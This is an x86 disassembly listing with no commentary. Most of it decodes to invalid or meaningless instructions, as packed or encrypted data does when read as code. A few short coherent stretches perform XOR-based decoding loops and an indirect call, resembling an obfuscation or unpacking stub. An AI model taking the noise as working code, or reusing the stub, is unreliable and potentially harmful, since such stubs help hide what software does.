  405930:	xor    BYTE PTR es:[ebx+0x13],ch
  405934:	push   ebx
  405935:	xchg   ecx,eax
  405936:	into   
  405937:	out    0xd6,al
  405939:	xchg   ebx,eax
  40593a:	mov    edx,0x72316d92
  40593f:	and    dh,BYTE PTR [eax+0x78]
  405942:	aad    0x60
  405944:	cmc    
  405945:	xchg   ecx,eax
  405946:	test   BYTE PTR [ecx-0x41],0x70
  40594a:	std    
  40594b:	jg     0x4059b3
  40594d:	mov    ecx,0x9198ba41
  405952:	xor    edx,DWORD PTR [ebx-0x156e6518]
  405958:	or     edx,ebx
  40595a:	cmp    DWORD PTR [ecx-0x1f],ebp
  40595d:	(bad)  
  40595e:	test   ecx,0xb284bbf7
  405964:	or     eax,0x942aef9d
  405969:	movnti DWORD PTR [ecx+ebp*2],esi
  40596d:	xchg   edx,eax
  40596e:	stos   DWORD PTR es:[edi],eax
  40596f:	mov    ecx,eax
  405971:	dec    ebp
  405972:	loope  0x40599d
  405974:	mov    eax,ds:0xa9ee886d
  405979:	dec    ebx
  40597a:	sti    
  40597b:	std    
  40597c:	push   DWORD PTR [edx+edi*8+0x3527e1c]
  405983:	sbb    cl,BYTE PTR [edi-0x79]
  405986:	mov    BYTE PTR [ebx-0x4d],dl
  405989:	fcomi  st,st(5)
  40598b:	repz fidiv WORD PTR [eax-0x575e9058]
  405992:	inc    ecx
  405993:	enter  0x4cb8,0xeb
  405997:	cmp    esp,ebp
  405999:	sub    BYTE PTR [edi],ch
  40599b:	and    esi,DWORD PTR [ebx]
  40599d:	add    edx,DWORD PTR [eax+0x43749252]
  4059a3:	in     al,0xae
  4059a5:	dec    esp
  4059a6:	inc    ebx
  4059a7:	aam    0x86
  4059a9:	lock shl dl,1
  4059ac:	push   ecx
  4059ad:	mov    eax,0x9b11d942
  4059b2:	mov    ah,0x62
  4059b4:	test   DWORD PTR [eax-0x3],esi
  4059b7:	add    DWORD PTR [ebx-0x69],0x8ac0abc5
  4059be:	iret   
  4059bf:	xchg   edx,eax
  4059c0:	or     al,cl
  4059c2:	fimul  DWORD PTR [eax+0x41]
  4059c5:	push   eax
  4059c6:	(bad)
  4059c9:	xlat   BYTE PTR ds:[ebx]
  4059ca:	xor    al,0xb4
  4059cc:	stos   BYTE PTR es:[edi],al
  4059cd:	jle    0x40596b
  4059cf:	enter  0x2562,0xaf
  4059d3:	(bad)  
  4059d4:	rcr    DWORD PTR [edx+0x9],1
  4059d7:	out    0x93,eax
  4059d9:	jl     0x405985
  4059db:	aas    
  4059dc:	push   0xffffffc1
  4059de:	mov    al,0x4c
  4059e0:	adc    bl,BYTE PTR [edx-0x3204de2]
  4059e6:	push   ss
  4059e7:	ret    
  4059e8:	dec    ebx
  4059e9:	imul   esi,DWORD PTR [edi+eax*8+0x6d2b5ad1],0x64f20f53
  4059f4:	cmp    al,0x3
  4059f6:	push   es
  4059f7:	(bad)  
  4059f8:	je     0x405a48
  4059fa:	push   edi
  4059fb:	jns    0x405a22
  4059fd:	mov    ch,0xd9
  4059ff:	rol    BYTE PTR [ecx*8-0x2c56c3e1],0x59
  405a07:	pop    edx
  405a08:	adc    al,BYTE PTR [ebx]
  405a0a:	pop    ss
  405a0b:	dec    esi
  405a0c:	mov    ebx,0x86e1d341
  405a11:	nop
  405a12:	or     al,0xb4
  405a14:	and    DWORD PTR [eax-0x654c19d9],0x1f
  405a1b:	jle    0x405a9b
  405a1d:	mov    ecx,DWORD PTR [ebp+0x32]
  405a20:	aad    0x2b
  405a22:	iret   
  405a23:	retf   
  405a24:	out    dx,al
  405a25:	jge    0x4059d5
  405a27:	mov    al,0x65
  405a29:	test   DWORD PTR [ebp+0x4f],0x5d578e9d
  405a30:	iret   
  405a31:	out    0xc7,al
  405a33:	inc    ebp
  405a34:	cld    
  405a35:	xor    al,0x85
  405a37:	pushf  
  405a38:	clc    
  405a39:	and    DWORD PTR ds:0x43365b,edx
  405a3f:	mov    eax,DWORD PTR [ebp-0x4]
  405a42:	mov    edx,DWORD PTR ds:0x43376f
  405a48:	xor    DWORD PTR ds:0x433643,edx
  405a4e:	push   esi
  405a4f:	mov    DWORD PTR ds:0x433767,0x6ead
  405a59:	mov    esi,DWORD PTR [ebp-0x8]
  405a5c:	mov    edx,0x7510853
  405a61:	and    DWORD PTR ds:0x43363f,ebx
  405a67:	xor    eax,edx
  405a69:	and    DWORD PTR ds:0x43371b,0x0
  405a73:	mov    ecx,DWORD PTR ds:0x43371b
  405a79:	inc    ecx
  405a7a:	mov    DWORD PTR ds:0x43371b,ecx
  405a80:	cmp    DWORD PTR ds:0x43371b,0x20
  405a87:	jne    0x405a99
  405a8d:	push   DWORD PTR [ebp-0x1c]
  405a90:	push   DWORD PTR [ebp-0x24]
  405a93:	call   DWORD PTR ds:0x412258
  405a99:	cmp    DWORD PTR ds:0x43371b,0x15
  405aa0:	jb     0x405a73
  405aa6:	xor    ecx,ecx
  405aa8:	add    ecx,DWORD PTR ds:0x43367b
  405aae:	mov    ecx,DWORD PTR [ecx]
  405ab0:	sbb    DWORD PTR ds:0x433757,ecx
  405ab6:	xor    esi,edx
  405ab8:	mov    ecx,0x32729a
  405abd:	add    esi,ecx
  405abf:	jmp    0x405e93
  405ac4:	aam    0x49
  405ac6:	in     eax,0x76
  405ac8:	ins    DWORD PTR es:[edi],dx
  405ac9:	jb     0x405b1e
  405acb:	imul   ebx,DWORD PTR ds:0x294d28f4,0x4694a2d8
  405ad5:	xor    edi,DWORD PTR [esp+edi*2-0x4b]
  405ad9:	jns    0x405b57
  405adb:	jl     0x405b31
  405add:	scas   eax,DWORD PTR es:[edi]
  405ade:	push   esp
  405adf:	cmp    edx,0x5211ad79
  405ae5:	ins    BYTE PTR es:[edi],dx
  405ae6:	push   ebp
  405ae7:	or     DWORD PTR [edx+0x28],eax
  405aea:	dec    eax
  405aeb:	push   ebx
  405aec:	je     0x405b62
  405aee:	or     ebx,DWORD PTR [ebx-0x2ce32974]
  405af4:	test   ebx,edi
  405af6:	daa    
  405af7:	jo     0x405b26
  405af9:	and    ecx,DWORD PTR [edi]
  405afb:	xor    ebx,ecx
  405afd:	ins    DWORD PTR es:[edi],dx
  405afe:	in     al,dx
  405aff:	or     ebx,DWORD PTR [edi]
  405b01:	(bad)  
  405b02:	out    0xd2,eax
  405b04:	aaa    
  405b05:	outs   dx,BYTE PTR ds:[esi]
  405b06:	xchg   ebx,eax
  405b07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b08:	sbb    al,BYTE PTR [edx+0x3d043167]
  405b0e:	inc    ebx
  405b0f:	loop   0x405ad1
  405b11:	mov    edi,0xa2186fd2
  405b16:	clc    
  405b17:	sub    ch,0xf8
  405b1a:	dec    esp
  405b1b:	cdq    
  405b1c:	(bad)
  405b20:	mov    ebp,0xf1d5b510
  405b25:	cmc    
  405b26:	lea    edi,[ebx+0x751726cd]
  405b2c:	mov    esp,0xaea2f93c
  405b31:	rcl    bl,cl
  405b33:	xchg   esp,eax
  405b34:	test   eax,0xd0200a95
  405b39:	(bad)  
  405b3a:	sti    
  405b3b:	xchg   BYTE PTR [ecx+0x30],ch
  405b3e:	add    al,0x92
  405b40:	sbb    cl,BYTE PTR [ecx+ebp*1+0x10]
  405b44:	dec    esp
  405b45:	(bad)
  405b49:	and    ebp,esp
  405b4b:	jne    0x405b64
  405b4d:	ja     0x405aea
  405b4f:	mov    al,ds:0x8cb33969
  405b54:	push   ebx
  405b55:	sub    BYTE PTR [ebx],0x2d
  405b58:	adc    BYTE PTR [esi],bl
  405b5a:	inc    edi
  405b5b:	push   es
  405b5c:	mov    ch,0x50
  405b5e:	imul   ebp,DWORD PTR [ebx-0x277703dd],0x47
  405b65:	aaa    
  405b66:	jns    0x405b89
  405b68:	sub    bl,BYTE PTR [ecx+0x5cf500db]
  405b6e:	xchg   ebp,eax
  405b6f:	inc    ebp
  405b70:	push   0x43
  405b72:	mov    eax,0x1cda4230
  405b77:	pop    edx
  405b78:	xor    DWORD PTR ds:0xc8658c3e,ebp
  405b7e:	lahf   
  405b7f:	push   esi
  405b80:	mov    DWORD PTR [ebp+0x1e],ebp
  405b83:	and    DWORD PTR [eax],esp
  405b85:	mov    esp,0xf22185c4
  405b8a:	repz and DWORD PTR [edi],0xed369e23
  405b91:	mov    edx,0xf25285a7
  405b96:	mov    bh,0x9e
  405b98:	(bad)  
  405b9a:	push   eax
  405b9b:	leave  
  405b9c:	inc    edi
  405b9d:	inc    ebp
  405b9e:	je     0x405b31
  405ba0:	or     dl,al
  405ba2:	cmc    
  405ba3:	addr16 aad 0x4f
  405ba6:	ret    
  405ba7:	add    al,0x83
  405ba9:	push   cs
  405baa:	pop    eax
  405bab:	mov    DWORD PTR [esi],eax
  405bad:	cld    
  405bae:	ss ss jmp 0x379e871d
  405bb5:	pop    ecx
  405bb6:	mov    ds:0x620a120e,al
  405bbb:	jge    0x405c29
  405bbd:	push   edi
  405bbe:	aaa    
  405bbf:	fld    QWORD PTR [eax]
  405bc1:	sbb    al,ch
  405bc3:	and    BYTE PTR [esi+0x3f30421a],bl
  405bc9:	sub    BYTE PTR [ecx],dh
  405bcb:	cmp    ah,BYTE PTR [ebp-0x2c]
  405bce:	jg     0x405b66
  405bd0:	sub    DWORD PTR [esi+ecx*8],ecx
  405bd3:	(bad)  
  405bd4:	mov    eax,ebx
  405bd6:	cmp    BYTE PTR [esi-0x4028e443],al
  405bdc:	mov    BYTE PTR [eax],al
  405bde:	dec    esi
  405bdf:	in     al,0x5f
  405be1:	test   al,0xf
  405be3:	sbb    ebp,DWORD PTR [edx]
  405be5:	aas    
  405be6:	sti    
  405be7:	loope  0x405baa
  405be9:	pmulhuw mm5,QWORD PTR [ebp-0x7e1b050]
  405bf0:	cs jg  0x405b80
  405bf3:	ss in  eax,dx
  405bf5:	popa   
  405bf6:	inc    ecx
  405bf7:	test   edx,esi
  405bf9:	ss jbe 0x405c4c
  405bfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bfd:	xlat   BYTE PTR ss:[ebx]
  405bff:	(bad)  
  405c00:	mov    ah,0x70
  405c02:	dec    esi
  405c03:	cwde   
  405c04:	loopne 0x405c47
  405c06:	mov    cs,ebx
  405c08:	nop
  405c09:	out    dx,al
  405c0a:	mov    bl,0x79
  405c0c:	push   esp
  405c0d:	retf   
  405c0e:	jg     0x405c1a
  405c10:	adc    bh,dh
  405c12:	cmc    
  405c13:	stc    
  405c14:	jmp    0x8c60:0x36885ae3
  405c1b:	dec    ebx
  405c1c:	nop
  405c1d:	sti    
  405c1e:	mov    edx,0x31682b2
  405c23:	jg     0x405c27
  405c25:	addr16 std 
  405c27:	mov    cl,0xa3
  405c29:	lock adc eax,0xe04c5326
  405c2f:	jge    0x405bb9
  405c31:	jmp    0x405bce
  405c33:	cli    
  405c34:	or     DWORD PTR [edx+edx*1+0x4a5f1551],esp
  405c3b:	cmp    bh,al
  405c3d:	popa   
  405c3e:	lahf   
  405c3f:	mov    ebp,0xa669c190
  405c44:	pop    ds
  405c45:	mov    edx,0x7f9b5677
  405c4a:	inc    edi
  405c4b:	inc    ecx
  405c4c:	mov    ds:0x7bcb78f8,eax
  405c51:	fxam   
  405c53:	and    ebx,DWORD PTR [ecx+0x14339846]
  405c59:	ror    BYTE PTR [ecx],1
  405c5b:	test   ebp,ecx
  405c5d:	fsubr  st(2),st
  405c5f:	sub    bh,al
  405c61:	push   ebp
  405c62:	mov    ch,0xe7
  405c64:	xor    al,0x83
  405c66:	call   0x3989:0x87700536
  405c6d:	jo     0x405c7b
  405c6f:	dec    eax
  405c70:	and    DWORD PTR [eax],ebp
  405c72:	mov    ebx,ebp
  405c74:	cs dec esp
  405c76:	mov    ch,bh
  405c78:	jae    0x405cee
  405c7a:	jnp    0x405cdc
  405c7c:	outs   dx,DWORD PTR ds:[esi]
  405c7d:	lods   al,BYTE PTR ds:[esi]
  405c7e:	fistp  DWORD PTR [ecx+0x2c5cc7a3]
  405c84:	jae    0x405c98
  405c86:	sar    BYTE PTR [ebx],cl
  405c88:	mov    bl,BYTE PTR [eax-0x31]
  405c8b:	mov    ebx,0xf47b3c5b
  405c90:	ret    0x7f0f
  405c93:	rcl    BYTE PTR [edi-0x4c],0x3b
  405c97:	hlt    
  405c98:	ss (bad) 
  405c9a:	clc    
  405c9b:	push   esi
  405c9c:	jle    0x405c93
  405c9e:	rcl    DWORD PTR [edx],0xa3
  405ca1:	jecxz  0x405cc3
  405ca3:	loop   0x405cb9
  405ca5:	mov    es,WORD PTR [eax-0x66e524d6]
  405cab:	clc    
  405cac:	lock cmc 
  405cae:	xchg   esp,eax
  405caf:	xchg   esi,eax
  405cb0:	and    esi,esp
  405cb2:	jae    0x405cb5
  405cb4:	dec    edi
  405cb5:	(bad)  
  405cb6:	dec    edx
  405cb7:	adc    DWORD PTR [ecx+0x40bcbb35],ebp
  405cbd:	out    0xdf,eax
  405cbf:	and    ebx,ecx
  405cc1:	sbb    si,WORD PTR [eax]
  405cc4:	push   ecx
  405cc5:	jns    0x405ccb
  405cc7:	xor    dh,BYTE PTR [ecx-0xccd5a69]
  405ccd:	sbb    al,0x24
  405ccf:	xor    BYTE PTR [esi],0x1a
  405cd2:	je     0x405d4f
  405cd4:	call   0xb2c7:0x92e9eed2
  405cdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cdc:	pop    ds
  405cdd:	inc    ebp
  405cde:	pop    es
  405cdf:	pop    es
  405ce0:	lods   eax,DWORD PTR ds:[esi]
  405ce1:	cmc    
  405ce2:	mov    dh,0xdd
  405ce4:	sbb    al,0x9c
  405ce6:	data16 das 
  405ce8:	and    BYTE PTR [esi+0x3a],dh
  405ceb:	jno    0x405c74
  405ced:	pop    ecx
  405cee:	icebp  
  405cef:	push   edi
  405cf0:	aad    0x44
  405cf2:	mov    ah,0x5b
  405cf4:	bound  ebx,QWORD PTR [edx+ebp*1+0x72]
  405cf8:	xor    dh,ah
  405cfa:	rol    BYTE PTR [esi],0xea
  405cfd:	xor    eax,0x32383b27
  405d02:	jl     0x405d4e
  405d04:	cdq    
  405d05:	enter  0xdedf,0x93
  405d09:	push   es
  405d0a:	sub    ecx,esp
  405d0c:	imul   esi,DWORD PTR [edi-0x6e],0x4
  405d10:	push   esi
  405d11:	popf   
  405d12:	mov    cl,0xb
  405d14:	xchg   ebx,eax
  405d15:	repnz int3 
  405d17:	(bad)  
  405d18:	out    dx,al
  405d19:	stc    
  405d1a:	ficom  DWORD PTR [ecx-0x61853d7e]
  405d20:	or     bh,dl
  405d22:	std    
  405d23:	bound  esp,QWORD PTR [esi]
  405d25:	not    DWORD PTR [ebp+esi*1-0x2f96ee06]
  405d2c:	popf   
  405d2d:	push   edi
  405d2e:	push   0x16
  405d30:	(bad)  
  405d32:	outs   dx,DWORD PTR ds:[esi]
  405d33:	push   esp
  405d34:	xchg   ecx,eax
  405d35:	div    DWORD PTR [esi-0x6e]
  405d38:	and    BYTE PTR [edx],ch
  405d3a:	dec    esp
  405d3b:	push   edi
  405d3c:	(bad)  
  405d3d:	sbb    ecx,esp
  405d3f:	fistp  WORD PTR [ecx]
  405d41:	xchg   ebx,eax
  405d42:	sub    BYTE PTR [edx+0x30],0xa4
  405d46:	xchg   esi,eax
  405d47:	add    eax,esi
  405d49:	test   eax,0x460d19fc
  405d4e:	sub    eax,0x7473d8a
  405d53:	ret    0x6ce5
  405d56:	ret    
  405d57:	add    ch,ch
  405d59:	cld    
  405d5a:	fsub   DWORD PTR es:[edx+0x1232a6a6]
  405d61:	rol    al,0x1e
  405d64:	dec    eax
  405d65:	pusha  
  405d66:	not    DWORD PTR [ebp+0x3d]
  405d69:	or     ah,cl
  405d6b:	sbb    eax,DWORD PTR [esp+eiz*8-0x30b79200]
  405d72:	pop    esi
  405d73:	dec    esp
  405d74:	aad    0x16
  405d76:	jno    0x405df4
  405d78:	pop    ecx
  405d79:	inc    esp
  405d7a:	inc    edi
  405d7b:	inc    esp
  405d7c:	call   0x4c74ef07
  405d81:	bnd js 0x405de3
  405d84:	xlat   BYTE PTR ds:[ebx]
  405d85:	pop    ebp
  405d86:	arpl   WORD PTR [eax+ebp*8-0x33610ef],ax
  405d8d:	arpl   WORD PTR [esi+esi*8-0x12],di
  405d91:	mov    ebp,0x24d5a4cb
  405d96:	push   esi
  405d97:	mov    ds:0x2d2a1b82,al
  405d9c:	jmp    0x26c1:0xc0ede3ed
  405da3:	xlat   BYTE PTR ds:[ebx]
  405da4:	out    0x95,al
  405da6:	mov    dl,0x94
  405da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405da9:	daa    
  405daa:	push   ds
  405dab:	pop    esp
  405dac:	adc    BYTE PTR ds:0x26b4444c,dh
  405db2:	push   cs
  405db3:	dec    edx
  405db4:	out    0xed,al
  405db6:	(bad)  
  405db7:	fcmove st,st(3)
  405db9:	mov    eax,ds:0x93381d54
  405dbe:	push   ecx
  405dbf:	lds    esp,FWORD PTR [edi+0x68]
  405dc2:	test   dh,bh
  405dc4:	pushf  
  405dc5:	ins    BYTE PTR es:[edi],dx
  405dc6:	aas    
  405dc7:	arpl   WORD PTR [eax+0x129c5632],ax
  405dcd:	sbb    eax,0xd204984f
  405dd2:	push   esp
  405dd3:	mov    dl,0xae
  405dd5:	(bad)  
  405dd6:	daa    
  405dd7:	ds iret 
  405dd9:	jnp    0x405e20
  405ddb:	xchg   esp,eax
  405ddc:	sub    eax,0xf4eb100c
  405de1:	cmp    BYTE PTR [eax+0x56],bh
  405de4:	out    dx,al
  405de5:	inc    eax
  405de6:	pop    ds
  405de7:	fisttp WORD PTR [esi-0x1a94c487]
  405ded:	push   ecx
  405dee:	adc    cl,BYTE PTR [edx+0x18]
  405df1:	and    ecx,ebp
  405df3:	fisub  DWORD PTR [ebx+0x19dce701]
  405df9:	scas   al,BYTE PTR es:[edi]
  405dfa:	add    BYTE PTR [ebp+0x4c9ac125],dl
  405e00:	das    
  405e01:	add    DWORD PTR [eax],esi
  405e03:	jp     0x405df3
  405e05:	pop    edi
  405e06:	loope  0x405e6b
  405e08:	repnz imul ebp,DWORD PTR [edx+0x2a],0x1e
  405e0d:	adc    eax,0x3dad90c5
  405e12:	sub    eax,0x196ae9ab
  405e17:	jae    0x405e1a
  405e19:	aaa    
  405e1a:	imul   BYTE PTR [esi+0x6a]
  405e1d:	bsr    esp,DWORD PTR ds:0x8adbfd57
  405e24:	inc    esi
  405e25:	mov    esp,0xaaa36d19
  405e2a:	ds adc al,0xf9
  405e2d:	retf   
  405e2e:	mov    bl,0xda
  405e30:	inc    eax
  405e31:	cmp    al,0xc7
  405e33:	and    al,0xd
  405e35:	push   edx
  405e36:	rcr    BYTE PTR [ecx+0x2c],0xb
  405e3a:	lds    esp,FWORD PTR [eax+0x6f]
  405e3d:	dec    edx
  405e3e:	ror    esp,cl
  405e40:	sbb    BYTE PTR [edi+0x38],cl
  405e43:	test   eax,0x647ac02e
  405e48:	xchg   edx,eax
  405e49:	mov    bl,0xaa
  405e4b:	ins    DWORD PTR es:[edi],dx
  405e4c:	cmp    edi,DWORD PTR [eax+edx*2-0x59]
  405e50:	js     0x405e89
  405e52:	pop    edi
  405e53:	mov    esp,0xc066fe7
  405e58:	stos   DWORD PTR es:[edi],eax
  405e59:	stos   BYTE PTR es:[edi],al
  405e5a:	cs adc ch,al
  405e5d:	aas    
  405e5e:	jle    0x405e81
  405e60:	ss cdq 
  405e62:	js     0x405deb
  405e64:	pop    eax
  405e65:	and    DWORD PTR [edi-0x78e0d7d0],edx
  405e6b:	lock cld 
  405e6d:	adc    DWORD PTR [esi-0x47a77c26],esp
  405e73:	test   DWORD PTR ds:0xe26cf3ef,ebp
  405e79:	mov    eax,ds:0xc0bac72b
  405e7e:	dec    esi
  405e7f:	jmp    0x405e28
  405e81:	mov    eax,cs
  405e83:	jb     0x405ea0
  405e85:	sub    eax,0x4aeafb9f
  405e8a:	not    BYTE PTR [edi]
  405e8c:	ds dec ecx
  405e8e:	adc    al,0x82
  405e90:	jno    0x405ee4
  405e92:	out    0x3,eax
  405e94:	ror    DWORD PTR [edi],0xaf
  405e97:	(bad)  
  405e98:	mov    esi,DWORD PTR [ebp+0xc]
  405e9b:	cmp    esi,eax
  405e9d:	jne    0x405eb9
  405ea3:	mov    eax,DWORD PTR [ebp-0x4]
  405ea6:	mov    esi,DWORD PTR [ebp-0x8]
  405ea9:	xor    eax,edx
  405eab:	xor    esi,edx
  405ead:	add    eax,ecx
  405eaf:	add    esi,ecx
  405eb1:	imul   eax,esi
  405eb4:	jmp    0x4062c8
  405eb9:	mov    eax,DWORD PTR [ebp+0xc]
  405ebc:	mov    eax,DWORD PTR [eax+0x78]
  405ebf:	mov    DWORD PTR [ebp+0xc],eax
  405ec2:	mov    eax,DWORD PTR [ebp-0x4]
  405ec5:	jmp    0x406299
  405eca:	bound  edx,QWORD PTR [eax-0x1c8e3b49]
  405ed0:	jge    0x405e84
  405ed2:	pop    ecx
  405ed3:	jo     0x405ebe
  405ed5:	mov    esi,0xbc6b6e03
  405eda:	(bad)  
  405edb:	aas    
  405edc:	jl     0x405f5a
  405ede:	mov    ch,0x79
  405ee0:	jl     0x405f5e
  405ee2:	dec    eax
  405ee3:	add    eax,0x8689cf68
  405ee8:	cdq    
  405ee9:	jecxz  0x405eb9
  405eeb:	imul   edx,ebx,0xffffffe0
  405eee:	(bad)  
  405eef:	and    eax,0x91a5d0c9
  405ef4:	ss in  al,0xa4
  405ef7:	dec    eax
  405ef8:	mov    al,ds:0x81ca473d
  405efd:	dec    edx
  405efe:	test   DWORD PTR [esp+ebp*4+0x425852c8],ebp
  405f05:	mov    ecx,0x6003ae03
  405f0a:	dec    ebp
  405f0b:	sahf   
  405f0c:	mov    al,0xa1
  405f0e:	adc    eax,0x36a62cf8
  405f13:	repnz rcl ecx,cl
  405f16:	pop    esi
  405f17:	mov    BYTE PTR [esi+0x681d0759],cl
  405f1d:	mov    eax,0xecf907a6
  405f22:	mov    esp,0x62e82988
  405f27:	std    
  405f28:	cwde   
  405f29:	sti    
  405f2a:	xor    DWORD PTR [esi],edx
  405f2c:	push   esi
  405f2d:	or     eax,0x2971686a
  405f32:	test   BYTE PTR [ecx+0x385e938f],0x2a
  405f39:	scas   eax,DWORD PTR es:[edi]
  405f3a:	inc    BYTE PTR [esi+0x52bbf5f9]
  405f40:	addr16 dec edx
  405f42:	shl    DWORD PTR [esi],0xd8
  405f45:	adc    al,0xfc
  405f47:	ins    BYTE PTR es:[edi],dx
  405f48:	ret    
  405f49:	pop    ss
  405f4a:	jg     0x405f28
  405f4c:	xchg   ecx,eax
  405f4d:	xchg   DWORD PTR [edi],edi
  405f4f:	dec    ebp
  405f50:	(bad)  
  405f51:	push   ebp
  405f52:	stc    
  405f53:	and    eax,0x74d8bf1b
  405f58:	out    dx,eax
  405f59:	pop    edi
  405f5a:	sbb    DWORD PTR [edi+0x19e0822c],ebp
  405f60:	adc    DWORD PTR [eax+0x4830eb2b],0x6
  405f67:	adc    eax,0x94320a68
  405f6c:	adc    eax,0xe47c8e01
  405f71:	ins    DWORD PTR es:[edi],dx
  405f72:	jmp    0xc3eced6d
  405f77:	mov    esi,0x775b080b
  405f7c:	pop    ds
  405f7d:	lock test al,0x2c
  405f80:	stc    
  405f81:	popfw  
  405f83:	test   eax,0xeac0379f
  405f88:	sbb    BYTE PTR [ebp-0x6b],ah
  405f8b:	add    BYTE PTR [esi-0x48],0x3f
  405f8f:	add    BYTE PTR [edi-0x6ad51590],al
  405f95:	scas   al,BYTE PTR es:[edi]
  405f96:	xchg   ecx,eax
  405f97:	jno    0x405fde
  405f99:	or     al,0x60
  405f9b:	pop    ss
  405f9c:	hlt    
  405f9d:	cmp    ebp,DWORD PTR [ebx]
  405f9f:	lock inc ecx
  405fa1:	rcl    ebx,0xcf
  405fa4:	mov    edi,0x9f2d7ca0
  405fa9:	rol    BYTE PTR [edx-0x3021d04b],cl
  405faf:	ret    
  405fb0:	rol    BYTE PTR [edx+0x11],0xc7
  405fb4:	movzx  edi,BYTE PTR [ebx+ecx*2]
  405fb8:	(bad)  
  405fb9:	int3   
  405fba:	std    
  405fbb:	mov    ch,BYTE PTR [ecx]
  405fbd:	out    0xa7,al
  405fbf:	add    BYTE PTR [edx],bh
  405fc1:	sti    
  405fc2:	lods   eax,DWORD PTR ds:[esi]
  405fc3:	jno    0x405fed
  405fc5:	pushf  
  405fc6:	test   al,0x29
  405fc8:	mov    fs,WORD PTR [edx+0x5b62a795]
  405fce:	sbb    BYTE PTR [edi],dh
  405fd0:	adc    al,0x9e
  405fd2:	das    
  405fd3:	jnp    0x40602e
  405fd5:	test   al,0x5b
  405fd7:	mov    ah,0xbc
  405fd9:	inc    esp
  405fda:	iret   
  405fdb:	rcl    BYTE PTR [eax-0x41],0x79
  405fdf:	cmp    DWORD PTR [ebp-0x28],ebx
  405fe2:	and    eax,0x8aa683fc
  405fe7:	ds js  0x406056
  405fea:	jb     0x405f83
  405fec:	inc    eax
  405fed:	and    esp,DWORD PTR [ebp+0x5e]
  405ff0:	sub    ebx,DWORD PTR ds:0x726cf2b
  405ff6:	push   esi
  405ff7:	enter  0x4161,0xaa
  405ffb:	push   ecx
  405ffc:	adc    ch,ah
  405ffe:	sar    BYTE PTR [edx-0x70],cl
  406001:	in     al,dx
  406002:	hlt    
  406003:	repz push ss
  406005:	xchg   ebx,eax
  406006:	mov    eax,ds:0xe31601cd
  40600b:	into   
  40600c:	imul   ebp,edi,0xdd7bd33e
  406012:	sbb    DWORD PTR [ebp-0x5b],0xffffffa4
  406016:	adc    al,0x91
  406018:	push   ecx
  406019:	mov    bl,0xae
  40601b:	dec    edx
  40601c:	in     al,dx
  40601d:	add    ebx,0xffffffae
  406020:	hlt    
  406021:	adc    edx,edi
  406023:	or     eax,0x3c62afae
  406028:	jno    0x4060a6
  40602a:	xor    ebp,DWORD PTR [eax+0x1bf13b9e]
  406030:	scas   eax,DWORD PTR es:[edi]
  406031:	dec    eax
  406032:	sub    al,0x4d
  406034:	dec    ebx
  406035:	call   DWORD PTR [eax-0x6e794dfa]
  40603b:	push   edx
  40603c:	pushf  
  40603d:	lea    edx,[edx+0x31a4d4e9]
  406043:	push   eax
  406044:	shl    cl,0xa4
  406047:	pop    ebp
  406048:	mov    ds:0x8cf4b171,al
  40604d:	repnz pushf 
  40604f:	jno    0x406010
  406051:	jecxz  0x40608b
  406053:	shl    cl,cl
  406055:	and    al,0x60
  406057:	sub    al,0x2d
  406059:	(bad)  
  40605a:	popf   
  40605b:	bound  esi,QWORD PTR [ecx+0x95d0c9c]
  406061:	ret    0x3e4
  406064:	dec    ecx
  406065:	cdq    
  406066:	cmp    ch,dl
  406068:	fs bswap ebp
  40606b:	retf   
  40606c:	loope  0x40604f
  40606e:	adc    al,0x3c
  406070:	or     DWORD PTR ds:0xf8a1121a,eax
  406076:	clc    
  406077:	cld    
  406078:	fnsave [ebp+0x68]
  40607b:	push   eax
  40607c:	pop    edx
  40607d:	aas    
  40607e:	retf   
  40607f:	mov    WORD PTR [ebx-0x7a],ds
  406082:	adc    ebp,DWORD PTR [edx]
  406084:	jl     0x406104
  406086:	pushf  
  406087:	mov    bh,0xee
  406089:	je     0x4060a4
  40608b:	jl     0x40603d
  40608d:	sahf   
  40608e:	mov    edi,0x6cf9e1b7
  406093:	sbb    edx,ecx
  406095:	jmp    0x8b479f1a
  40609a:	or     bl,BYTE PTR ds:0xff107c56
  4060a0:	call   0x32033348
  4060a5:	jnp    0x406027
  4060a7:	inc    esi
  4060a8:	cmp    eax,DWORD PTR [edx+eiz*2]
  4060ab:	lods   eax,DWORD PTR ds:[esi]
  4060ac:	and    eax,0xed54da1c
  4060b1:	jo     0x4060d0
  4060b3:	setne  BYTE PTR [ecx+0x2620d097]
  4060ba:	jg     0x4060e4
  4060bc:	call   0x5934785
  4060c1:	mov    bl,0xad
  4060c3:	jl     0x406049
  4060c5:	cli    
  4060c6:	leave  
  4060c7:	sub    al,0xbe
  4060c9:	jno    0x406133
  4060cb:	mov    bl,0xb0
  4060cd:	and    DWORD PTR [edi+0x43],esp
  4060d0:	int    0xf2
  4060d2:	cld    
  4060d3:	leave  
  4060d4:	mov    edi,0x3b05aa3b
  4060d9:	shl    BYTE PTR [ebp-0xc],0x5d
  4060dd:	pushf  
  4060de:	jns    0x4060c7
  4060e0:	ins    DWORD PTR es:[edi],dx
  4060e1:	ret    0xba65
  4060e4:	push   0x23
  4060e6:	shl    DWORD PTR [ecx-0x3870f52f],0xbd
  4060ed:	int    0x60
  4060ef:	fisubr DWORD PTR [ebx-0xddbbcf8]
  4060f5:	out    dx,eax
  4060f6:	sub    DWORD PTR [eax],esi
  4060f8:	inc    ebx
  4060f9:	mov    esi,0xf735df46
  4060fe:	ret    
  4060ff:	fwait
  406100:	sbb    al,0x40
  406102:	xor    ebx,0xfffffff9
  406105:	mov    eax,0x7a99b8a3
  40610a:	xor    bh,cl
  40610c:	(bad)  
  40610d:	jge    0x4060a3
  40610f:	and    BYTE PTR [eax-0x22],0x5c
  406113:	add    esp,DWORD PTR [ecx+ecx*4-0x3ff644fa]
  40611a:	jne    0x406124
  40611c:	fwait
  40611d:	loopne 0x4060d9
  40611f:	(bad)  
  406120:	das    
  406121:	dec    esi
  406122:	retf   0x2fbb
  406125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406126:	dec    eax
  406127:	inc    ecx
  406128:	push   es
  406129:	or     BYTE PTR [eax+0x6a],0x20
  40612d:	push   ecx
  40612e:	pop    ds
  40612f:	xor    esp,DWORD PTR [eax+0x70]
  406132:	pop    ds
  406133:	gs push es
  406135:	pop    ds
  406136:	bound  ecx,QWORD PTR [esi]
